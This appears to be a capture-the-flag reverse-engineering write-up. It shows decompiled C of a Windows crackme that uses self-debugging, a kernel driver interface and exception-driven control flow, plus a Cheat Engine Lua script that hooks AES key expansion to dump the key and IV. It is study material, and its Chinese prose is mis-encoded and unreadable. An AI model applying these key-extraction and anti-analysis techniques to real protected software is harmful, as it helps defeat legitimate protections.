<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">child</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE FileA; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  SOCKET v2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  SOCKET v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  __int64 out; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 OutBuffer; <span class="comment">// [rsp+48h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  FileA = CreateFileA(<span class="string">&quot;\\\\.\\BrownProtectorDeviceLink&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0LL</span>, <span class="number">3u</span>, <span class="number">4u</span>, <span class="number">0LL</span>);</span><br><span class="line">  hDevice = FileA;</span><br><span class="line">  <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( DeviceIoControl(FileA, <span class="number">0x224004</span>u, <span class="number">0LL</span>, <span class="number">0</span>, &amp;OutBuffer, <span class="number">8u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( OutBuffer == <span class="number">0x1337</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        zero = <span class="number">1</span> / zero;</span><br><span class="line">        out = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( DeviceIoControl(hDevice, <span class="number">0x22400C</span>u, <span class="number">0LL</span>, <span class="number">0</span>, &amp;out, <span class="number">8u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( out != <span class="number">0xDEAD</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = !vm();</span><br><span class="line">            v5 = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v3 )</span><br><span class="line">              v5 = <span class="number">3</span>;</span><br><span class="line">            v6 = v5 % zero;</span><br><span class="line">            zero = v5 / zero;</span><br><span class="line">            shutdown(v4, v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  shutdown(v2, v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> __fastcall <span class="title function_">handler</span><span class="params">(_DEBUG_EVENT *debug_event)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int128 v1; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v2; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v3; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v4; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v5; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v6; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v7; <span class="comment">// xmm1</span></span><br><span class="line">  __int128 v8; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 v9; <span class="comment">// xmm1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdi</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// rax</span></span><br><span class="line">  _OWORD *v14; <span class="comment">// rax</span></span><br><span class="line">  _OWORD *v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 lenth; <span class="comment">// rax</span></span><br><span class="line">  __int64 OutBuffer; <span class="comment">// [rsp+40h] [rbp-C0h] BYREF</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [rsp+50h] [rbp-B0h] BYREF</span></span><br><span class="line">  _OWORD v20[<span class="number">4</span>]; <span class="comment">// [rsp+520h] [rbp+420h] BYREF</span></span><br><span class="line">  _OWORD v21[<span class="number">4</span>]; <span class="comment">// [rsp+560h] [rbp+460h] BYREF</span></span><br><span class="line">  _OWORD v22[<span class="number">4</span>]; <span class="comment">// [rsp+5A0h] [rbp+4A0h] BYREF</span></span><br><span class="line">  _OWORD v23[<span class="number">4</span>]; <span class="comment">// [rsp+5E0h] [rbp+4E0h] BYREF</span></span><br><span class="line">  _OWORD v24[<span class="number">4</span>]; <span class="comment">// [rsp+620h] [rbp+520h] BYREF</span></span><br><span class="line">  _OWORD v25[<span class="number">4</span>]; <span class="comment">// [rsp+660h] [rbp+560h] BYREF</span></span><br><span class="line">  _OWORD v26[<span class="number">4</span>]; <span class="comment">// [rsp+6A0h] [rbp+5A0h] BYREF</span></span><br><span class="line">  _OWORD v27[<span class="number">4</span>]; <span class="comment">// [rsp+6E0h] [rbp+5E0h] BYREF</span></span><br><span class="line">  _OWORD v28[<span class="number">4</span>]; <span class="comment">// [rsp+720h] [rbp+620h] BYREF</span></span><br><span class="line">  _OWORD v29[<span class="number">4</span>]; <span class="comment">// [rsp+760h] [rbp+660h] BYREF</span></span><br><span class="line">  _OWORD v30[<span class="number">4</span>]; <span class="comment">// [rsp+7A0h] [rbp+6A0h] BYREF</span></span><br><span class="line">  _OWORD v31[<span class="number">4</span>]; <span class="comment">// [rsp+7E0h] [rbp+6E0h] BYREF</span></span><br><span class="line">  _OWORD v32[<span class="number">4</span>]; <span class="comment">// [rsp+820h] [rbp+720h] BYREF</span></span><br><span class="line">  _OWORD v33[<span class="number">4</span>]; <span class="comment">// [rsp+860h] [rbp+760h] BYREF</span></span><br><span class="line">  _OWORD v34[<span class="number">4</span>]; <span class="comment">// [rsp+8A0h] [rbp+7A0h] BYREF</span></span><br><span class="line">  _OWORD v35[<span class="number">4</span>]; <span class="comment">// [rsp+8E0h] [rbp+7E0h] BYREF</span></span><br><span class="line">  _OWORD v36[<span class="number">4</span>]; <span class="comment">// [rsp+920h] [rbp+820h] BYREF</span></span><br><span class="line">  _OWORD v37[<span class="number">4</span>]; <span class="comment">// [rsp+960h] [rbp+860h] BYREF</span></span><br><span class="line">  _OWORD v38[<span class="number">4</span>]; <span class="comment">// [rsp+9A0h] [rbp+8A0h] BYREF</span></span><br><span class="line">  _OWORD v39[<span class="number">4</span>]; <span class="comment">// [rsp+9E0h] [rbp+8E0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_OWORD *)&amp;debug_event-&gt;u.Exception.ExceptionRecord.ExceptionCode;</span><br><span class="line">  *(_OWORD *)&amp;Context.P1Home = *(_OWORD *)&amp;debug_event-&gt;dwDebugEventCode;</span><br><span class="line">  v2 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">1</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.P3Home = v1;</span><br><span class="line">  v3 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">2</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.P5Home = v2;</span><br><span class="line">  v4 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">3</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.ContextFlags = v3;</span><br><span class="line">  v5 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">4</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.SegGs = v4;</span><br><span class="line">  v6 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">5</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Dr1 = v5;</span><br><span class="line">  v7 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">7</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Dr3 = v6;</span><br><span class="line">  *(_OWORD *)&amp;Context.Dr7 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">6</span>);</span><br><span class="line">  v8 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">8</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Rcx = v7;</span><br><span class="line">  v9 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">9</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Rbx = v8;</span><br><span class="line">  *(_OWORD *)&amp;Context.Rbp = v9;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(Context.P1Home) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(Context.P1Home) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      hProcess = (HANDLE)Context.P4Home;</span><br><span class="line">      hThread = (HANDLE)Context.P5Home;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">register</span>() )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        FileA = CreateFileA(<span class="string">&quot;\\\\.\\BrownProtectorDeviceLink&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0LL</span>, <span class="number">3u</span>, <span class="number">4u</span>, <span class="number">0LL</span>);</span><br><span class="line">        hObject = FileA;</span><br><span class="line">        <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1LL</span></span><br><span class="line">          &amp;&amp; DeviceIoControl(FileA, <span class="number">0x224000</span>u, <span class="number">0LL</span>, <span class="number">0</span>, &amp;OutBuffer, <span class="number">8u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>)</span><br><span class="line">          &amp;&amp; OutBuffer == <span class="number">0x1337</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v20[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BD0);</span><br><span class="line">          v21[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B20);</span><br><span class="line">          v22[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C10);</span><br><span class="line">          v23[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BE0);</span><br><span class="line">          v24[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B00);</span><br><span class="line">          v25[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AC0);</span><br><span class="line">          v26[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C30);</span><br><span class="line">          v27[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BA0);</span><br><span class="line">          v28[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B80);</span><br><span class="line">          v29[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BC0);</span><br><span class="line">          v30[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BB0);</span><br><span class="line">          v31[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B30);</span><br><span class="line">          v32[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B60);</span><br><span class="line">          v33[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AD0);</span><br><span class="line">          v34[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C40);</span><br><span class="line">          v35[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AE0);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v20[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v21[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v22[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v23[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v24[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v25[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v26[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v27[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v28[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v29[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v30[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v31[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v32[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v33[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v34[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v35[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          Context.P1Home = (DWORD64)v20;</span><br><span class="line">          v36[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B70);</span><br><span class="line">          v12 = <span class="number">0LL</span>;</span><br><span class="line">          Context.P2Home = (DWORD64)v21;</span><br><span class="line">          Context.P3Home = (DWORD64)v22;</span><br><span class="line">          Context.P4Home = (DWORD64)v23;</span><br><span class="line">          Context.P5Home = (DWORD64)v24;</span><br><span class="line">          Context.P6Home = (DWORD64)v25;</span><br><span class="line">          *(_QWORD *)&amp;Context.ContextFlags = v26;</span><br><span class="line">          *(_QWORD *)&amp;Context.SegCs = v27;</span><br><span class="line">          *(_QWORD *)&amp;Context.SegGs = v28;</span><br><span class="line">          Context.Dr0 = (DWORD64)v29;</span><br><span class="line">          Context.Dr1 = (DWORD64)v30;</span><br><span class="line">          Context.Dr2 = (DWORD64)v31;</span><br><span class="line">          Context.Dr3 = (DWORD64)v32;</span><br><span class="line">          Context.Dr6 = (DWORD64)v33;</span><br><span class="line">          Context.Dr7 = (DWORD64)v34;</span><br><span class="line">          Context.Rax = (DWORD64)v35;</span><br><span class="line">          Context.Rcx = (DWORD64)v36;</span><br><span class="line">          v37[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B40);</span><br><span class="line">          Context.Rdx = (DWORD64)v37;</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v36[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          Context.Rbx = (DWORD64)v38;</span><br><span class="line">          Context.Rsp = (DWORD64)v39;</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v37[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          v38[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B10);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v38[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          v39[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C00);</span><br><span class="line">          v39[<span class="number">1</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C20);</span><br><span class="line">          v39[<span class="number">2</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AF0);</span><br><span class="line">          v39[<span class="number">3</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BF0);</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = VirtualAlloc(<span class="number">0LL</span>, <span class="number">0x800</span>uLL, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">            (&amp;in)[v12] = v13;</span><br><span class="line">            <span class="keyword">if</span> ( !v13 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">            v14 = *(_OWORD **)((<span class="type">char</span> *)&amp;Context.P1Home + v12 * <span class="number">8</span>);</span><br><span class="line">            ++v10;</span><br><span class="line">            v15 = (&amp;in)[v12++];</span><br><span class="line">            *v15 = *v14;</span><br><span class="line">            v15[<span class="number">1</span>] = v14[<span class="number">1</span>];</span><br><span class="line">            v15[<span class="number">2</span>] = v14[<span class="number">2</span>];</span><br><span class="line">            v15[<span class="number">3</span>] = v14[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">if</span> ( v10 &gt;= <span class="number">20</span> )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          TerminateProcess(hProcess, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( LODWORD(Context.P1Home) != <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(Context.P3Home) == <span class="number">0xC0000094</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Context.ContextFlags = <span class="number">0x10001F</span>;</span><br><span class="line">    GetThreadContext(hThread, &amp;Context);</span><br><span class="line">    <span class="keyword">switch</span> ( Context.Rax )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        print(<span class="string">&quot;Welcome! Give me the key and I will give you the flag: &quot;</span>);</span><br><span class="line">        input(<span class="string">&quot;%128s&quot;</span>, in);</span><br><span class="line">        lenth = <span class="number">-1LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          ++lenth;</span><br><span class="line">        <span class="keyword">while</span> ( in[lenth] );</span><br><span class="line">        <span class="keyword">if</span> ( lenth != <span class="number">0x40</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Wrong1&quot;</span>);</span><br><span class="line">          TerminateProcess(hProcess, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DeviceIoControl(hObject, <span class="number">0x224008</span>u, &amp;in, <span class="number">0xA0</span>u, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct. Here is your flag&quot;</span>);</span><br><span class="line">        decrypt((__int64)in);</span><br><span class="line">        Context.Rip += <span class="number">6LL</span>;</span><br><span class="line">        Context.Rax = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong0&quot;</span>);</span><br><span class="line">        Context.Rip += <span class="number">6LL</span>;</span><br><span class="line">        Context.Rax = <span class="number">0LL</span>;</span><br><span class="line">LABEL_29:</span><br><span class="line">        SetThreadContext(hThread, &amp;Context);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Context.Rip += <span class="number">6LL</span>;</span><br><span class="line">    Context.Rax = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(Context.P3Home) == <span class="number">0xC0000005</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Context.ContextFlags = <span class="number">0x10001F</span>;</span><br><span class="line">    GetThreadContext(hThread, &amp;Context);</span><br><span class="line">    Context.Rip += <span class="number">8LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DEBUG_EVENT v4; <span class="comment">// [rsp+50h] [rbp-308h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [rsp+100h] [rbp-258h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [rsp+120h] [rbp-238h] BYREF</span></span><br><span class="line">  _DEBUG_EVENT DebugEvent; <span class="comment">// [rsp+190h] [rbp-1C8h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">256</span>]; <span class="comment">// [rsp+240h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">    child();</span><br><span class="line">  GetModuleFileNameA(<span class="number">0LL</span>, Filename, <span class="number">0x100</span>u);</span><br><span class="line">  StartupInfo.cb = <span class="number">0x68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo.cb + <span class="number">1</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));</span><br><span class="line">  <span class="keyword">if</span> ( CreateProcessA(Filename, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = DebugEvent;</span><br><span class="line">      <span class="keyword">if</span> ( !handler(&amp;v4) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hObject);</span><br><span class="line">    nop_();</span><br><span class="line">    nop();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[!] Can&#x27;t create child process&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€é¢˜å°±æ˜¯å¦‚æœä¸è°ƒè¯•å­è¿›ç¨‹å°±ä¼šéå¸¸å›°éš¾çš„ä¾‹å­ æœ¬é¢˜çš„æ ¡éªŒå’ŒåŠ å¯†å…¨éƒ¨åœ¨<code>child()</code>ä¸­ <code>handler()</code>åªèµ·åˆ°æ¥æ”¶æ•°æ®å’Œåˆå§‹åŒ–ä¸€äº›æ•°æ®çš„åŠŸèƒ½ è€Œæ­£å¸¸æ¥è¯´Windowsè¿›ç¨‹æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸€å—è™šæ‹Ÿå†…å­˜ ä¸åŒè¿›ç¨‹ä¹‹é—´ä¸å…è®¸è®¿é—®å¯¹æ–¹å†…å­˜ æ‰€ä»¥è¿™é¢˜é€šè¿‡ä¸€ä¸ªé©±åŠ¨ç¨‹åº(.sys)ç›´æ¥å¾—åˆ°æ‰€æœ‰æ•°æ®çš„ç‰©ç†åœ°å€å¹¶è¿›è¿‡ä¸€ç³»åˆ—å¤„ç†å†ä¼ ç»™<code>child()</code>ä¸­çš„<code>vm()</code>(å¤ªé•¿ä¸æ”¾) å½“ä½œAESåŠ å¯†çš„å¯†é’¥å’Œiv è€Œå†…æ ¸å¯¹å†…å­˜èµ„æºçš„ç®¡ç†å’Œä½¿ç”¨è¦ç»è¿‡è™šæ‹Ÿå†…å­˜è½¬ç‰©ç†å†…å­˜å†æ ¹æ®å››çº§å†…å­˜é¡µæ¥è·å–å†…å­˜å›ºå®šçš„æœ€åå‡ ä½è¿›è¡Œç»„åˆ ä¹‹åæ‰èƒ½æ“ä½œç”¨æˆ·è¿›ç¨‹çš„èµ„æº è€Œä¸”<a href="https://1k0ct.github.io/2024/09/28/IDA%E9%85%8D%E5%90%88VMware%E8%BF%9B%E8%A1%8C%E5%86%85%E6%A0%B8-%E9%A9%B1%E5%8A%A8-%E8%B0%83%E8%AF%95/">å†…æ ¸è°ƒè¯•</a>çš„å‰ç½®æ¡ä»¶æ¯”è¾ƒå¤š æ‰€ä»¥é€‰æ‹©ç”¨CEè°ƒè¯•</p>
<p>å¼€å¯DBVMéœ€è¦å…ˆå¼€å¯CPUè™šæ‹ŸåŒ– è¿™é‡Œç”¨CEçš„Luaå¼•æ“ä½¿ç”¨CEçš„APIæ¥Hook AESå¯†é’¥æ‰©å±•æ­¥éª¤æ¥è·å–å¯†é’¥å’Œiv</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-131338.png" alt="image-20240928131338013"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-131519.png" alt="image-20240928131519855"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-132928.png" alt="image-20240928132928505"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-133209.png" alt="image-20240928133209644"></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexstr</span><span class="params">(bt)</span></span></span><br><span class="line">    <span class="keyword">local</span> hexstring = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="built_in">byte</span> <span class="keyword">in</span> <span class="built_in">ipairs</span>(bt) <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">table</span>.<span class="built_in">insert</span>(hexstring, <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;0x%02x&quot;</span>, <span class="built_in">byte</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(hexstring, <span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">debug_setBreakpoint(<span class="number">0x7FF7BE131000</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> key = hexstr(readBytes(RDX, <span class="number">16</span>, <span class="literal">true</span>))</span><br><span class="line">    <span class="keyword">local</span> iv  = hexstr(readBytes(RBX, <span class="number">16</span>, <span class="literal">true</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;[%s],\n[%s],\n&quot;</span>, key, iv))</span><br><span class="line"><span class="keyword">end</span>)</span><br><span class="line"></span><br><span class="line">debug_setBreakpoint(<span class="number">0x7FF7BE132741</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> enc = hexstr(readBytes(RDX, <span class="number">0x40</span>, <span class="literal">true</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;[%s]&quot;</span>, enc))</span><br><span class="line"><span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>

<p>CEè„šæœ¬ç›¸è¾ƒäºIDAè„šæœ¬æ›´å®¹æ˜“ç¼–å†™ å› ä¸ºLuaå¼•æ“åœ¨å¯¼å…¥è„šæœ¬æ—¶è‡ªåŠ¨åŠ å…¥äº†åŒ…æ‹¬å¯„å­˜å™¨çš„å…¨å±€å˜é‡å¯ä»¥ç›´æ¥ä½¿ç”¨</p>
